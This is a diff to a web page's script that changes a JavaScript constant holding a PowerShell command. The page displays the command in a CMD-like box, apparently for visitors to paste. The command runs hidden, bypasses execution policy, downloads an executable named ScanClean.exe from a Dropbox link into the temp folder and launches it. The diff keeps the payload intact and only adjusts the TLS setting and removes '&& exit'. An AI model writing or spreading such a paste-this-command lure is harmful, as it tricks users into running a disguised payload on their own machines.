@@ -529,7 +529,7 @@
     </div>
 
 <script>
-    const command = String.raw`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls,Tls11,Tls12'; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri 'https://www.dropbox.com/scl/fi/t48zd7aznv2hpbezafs19/ScanClean.exe?rlkey=m23fe1tnhzu1pc4ouc7u131ym&st=j2nfwpis&dl=1' -OutFile $env:TEMP\ScanClean.exe; Start-Process $env:TEMP\ScanClean.exe" && exit`;
+    const command = String.raw`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri 'https://www.dropbox.com/scl/fi/t48zd7aznv2hpbezafs19/ScanClean.exe?rlkey=m23fe1tnhzu1pc4ouc7u131ym&st=j2nfwpis&dl=1' -OutFile $env:TEMP\ScanClean.exe; Start-Process $env:TEMP\ScanClean.exe"`;
 
     // عرض الأمر داخل CMD-like box
     document.getElementById('cmdText').innerText = command;
